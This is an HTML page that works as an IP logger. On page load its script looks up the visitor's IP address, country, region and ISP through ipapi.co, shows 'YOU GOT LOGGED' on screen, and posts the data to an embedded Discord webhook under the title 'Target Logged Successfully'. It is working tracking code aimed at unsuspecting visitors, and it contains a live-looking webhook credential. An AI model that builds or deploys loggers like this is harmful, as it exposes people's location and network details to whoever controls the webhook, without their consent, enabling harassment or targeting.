<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Established</title>
    <style>
        /* Black Background & Center Layout */
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* White Glowy Text Styling */
        .status-text {
            font-size: 3rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 5px;
            color: #fff;
            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff;
            margin-bottom: 20px;
            text-align: center;
        }

        .info-box {
            font-size: 1.2rem;
            color: #ccc;
            margin-bottom: 40px;
            text-align: center;
        }

        /* Waving Flag Animation */
        .flag-container {
            font-size: 80px; /* Big Flag */
            animation: wave 2s ease-in-out infinite;
            display: inline-block;
        }

        @keyframes wave {
            0%, 100% { transform: rotate(-10deg) translateY(0); }
            50% { transform: rotate(10deg) translateY(-20px); }
        }
    </style>
</head>
<body>

    <div class="status-text">YOU GOT LOGGED</div>
    
    <div class="info-box">
        <p>IP: <span id="ip">Fetching...</span></p>
        <p>Country: <span id="country">Detecting...</span></p>
    </div>

    <div id="flag" class="flag-container">üè¥</div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function initLogger() {
            try {
                // 1. Fetch IP and Location Data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Update the Screen Text
                document.getElementById('ip').innerText = data.ip;
                document.getElementById('country').innerText = data.country_name;
                
                // 3. Update Flag (Using Emoji or Image)
                // We use a library or emoji for the waving effect
                if (data.country_code) {
                    const flagEmoji = data.country_code.toUpperCase().replace(/./g, char => 
                        String.fromCodePoint(char.charCodeAt(0) + 127397)
                    );
                    document.getElementById('flag').innerText = flagEmoji;
                }

                // 4. Send to Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "üîí Target Logged Successfully",
                            color: 0, // Solid Black
                            fields: [
                                { name: "IP Address", value: `\`${data.ip}\``, inline: true },
                                { name: "Location", value: `${data.country_name} (${data.region})`, inline: true },
                                { name: "Provider", value: data.org, inline: false }
                            ],
                            footer: { text: "Logger by @cc.comp" },
                            timestamp: new Date()
                        }]
                    })
                });

            } catch (error) {
                console.error("Logger Error:", error);
                document.getElementById('ip').innerText = "Error";
            }
        }

        initLogger();
    </script>
</body>
</html>
